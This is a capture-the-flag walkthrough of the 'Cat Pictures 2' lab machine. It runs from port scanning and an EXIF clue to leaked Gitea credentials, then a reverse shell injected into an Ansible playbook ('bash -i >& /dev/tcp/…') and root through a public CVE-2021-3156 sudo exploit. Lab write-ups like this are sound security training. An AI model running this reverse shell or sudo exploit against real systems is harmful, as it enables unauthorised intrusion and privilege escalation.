
[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=35&pause=1000&color=6A0DAD&width=435&lines=Cat+Pictures+2)](https://git.io/typing-svg)

</br>

![catpic2](https://github.com/ACHUX21/Writeups/assets/130113878/ccc85a50-860e-4206-afe2-b88c0614a7a6)

# Enumeration
##
### Let's begin with a rapid Nmap scan.
</br>

```bash
root@Fs:.../CTFs/catpictures2# nmap -sCV -oN nmap 10.10.44.70
# Nmap 7.80 scan initiated Mon Jul  3 19:58:08 2023 as: nmap -sCV -oN nmap 10.10.44.70
Nmap scan report for 10.10.44.70
Host is up (0.079s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
|_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
|_http-title: Lychee
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul  3 19:58:29 2023 -- 1 IP address (1 host up) scanned in 21.17 seconds
```
##
    *80 — lychee*
    *8080 — python http server*
    *22,222 — ssh*
</br>

### Performing a scan using Dirsearch

```bash

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.187.79/-_23-07-06_21-12-01.txt

Error Log: /root/.dirsearch/logs/errors-23-07-06_21-12-01.log

Target: http://10.10.187.79/

[21:12:01] Starting: 
[21:12:03] 301 -  193B  - /robots.txt 
[21:12:04] 403 -  579B  - /.git/
[21:12:04] 403 -  579B  - /.github/
[21:12:04] 403 -  579B  - /.git/refs/
[21:12:04] 403 -  579B  - /.git/objects/
[21:12:04] 200 -  154B  - /.github/ISSUE_TEMPLATE.md
[21:12:04] 200 -  274B  - /.gitignore
[21:12:04] 200 -  630B  - /.htaccess
[21:12:07] 200 -  387B  - /.user.ini
[21:12:09] 200 -    1KB - /LICENSE
[21:12:10] 200 -    5KB - /README.md
```

I attempted to gather information by exploring the .git repository and robots.txt file, but unfortunately, I didn't find anything of interest.
</br>
After some time, I managed to discover interesting information from the EXIF data extracted from an image.

```
root@Fs:.../CTFs/catpictures2# exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
ExifTool Version Number         : 12.40
File Name                       : f5054e97620f168c7b5088c85ab1d6e4.jpg
Directory                       : .
File Size                       : 71 KiB
File Modification Date/Time     : 2022:11:07 19:44:37+01:00
File Access Date/Time           : 2023:07:06 21:20:55+01:00
File Inode Change Date/Time     : 2023:07:06 21:19:41+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : c2
Profile Copyright               : IX
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0.01205 0.0125 0.01031
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
XMP Toolkit                     : Image::ExifTool 12.49
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
Image Width                     : 720
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 720x1080
Megapixels                      : 0.778
```
this part
```Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt```
##
It appears that the system is utilizing The other web server to retrieve Info.

```red
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```
</br>
 samarium:TUmhyZ37CLZrhP
</br>

### Upon obtaining this information, we realized that there is a Gitea server running on port 3000, and we have obtained valid credentials for it.

![Screenshot from 2023-07-06 21-31-32](https://github.com/ACHUX21/Writeups/assets/130113878/d5da60f1-a1cd-4731-af5d-89b6eccc7f87)

# Gaining access
![image](https://github.com/ACHUX21/Writeups/assets/130113878/23cfac7c-5b54-494f-a91b-be69ffc138f1)
</br>

Given our knowledge of Ansible Runner (Olivetin) on port 1337, which enables the execution of Ansible playbooks, I intend to replace the existing "echo" command with a reverse shell.

```bash
bash -c "bash -i >& /dev/tcp/10.18.81.1/14632 0>&1"
```

After obtaining a shell, I discovered an "id_rsa" file, which I utilized to establish a more stable shell.
Subsequently, I attempted to exec Linpeas on the server to conduct further enumeration and analysis.

```bash
bismuth@catpictures-ii:~$ ls
flag2.txt
```

</br>
## Priv-Esc


we have a vulnerable sudo version here.
After patiently waiting during the Linpeas scan, I stumbled upon an interesting CVE (Common Vulnerabilities and Exposures) in the target machine. To gather more information, I conducted a Google search and came across a GitHub proof-of-concept ([! POC](https://github.com/blasty/CVE-2021-3156)) related to the discovered vulnerability.

</br>


Let's set up a Python3 server to share the CVE details with the target.

```bash
root@Fs:.../www/html# ll
total 9.6M
drwxr-xr-x 3 root  root  4.0K Jul  5 18:01 CVE-2021-3156/
-rw-r--r-- 1 root  root  3.1M Jun  4 05:27 linpeas_linux_amd64
-rwxrwxr-x 1 achux achux 817K Jun  6 16:41 linpeas.sh*
-rw-rw-r-- 1 achux achux 5.7M Jun  5 23:55 nmap
-rw-r--r-- 1 root  root   18K Jun  6 15:42 PwnKit
root@Fs:.../www/html# webup
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
! note : webup /=/ alias "webup='python3 -m http.server 8000'"


```bash
bismuth@catpictures-ii:/$ cd /tmp; wget -r 10.18.81.222/CVE-2021-3156/
```

let's go aHead to explore the CVE

```bash
bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ls
brute.sh  hax.c  lib.c  Makefile  README.md
bismuth@catpictures-ii:/tmp/CVE-2021-3156$ make
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ls
brute.sh  hax.c  lib.c  libnss_X  Makefile  README.md  sudo-hax-me-a-sandwich
bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>

bismuth@catpictures-ii:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1000(bismuth)
# 
```
And now we have pwned the machine
I appreciate your patience❤️ 





 
 













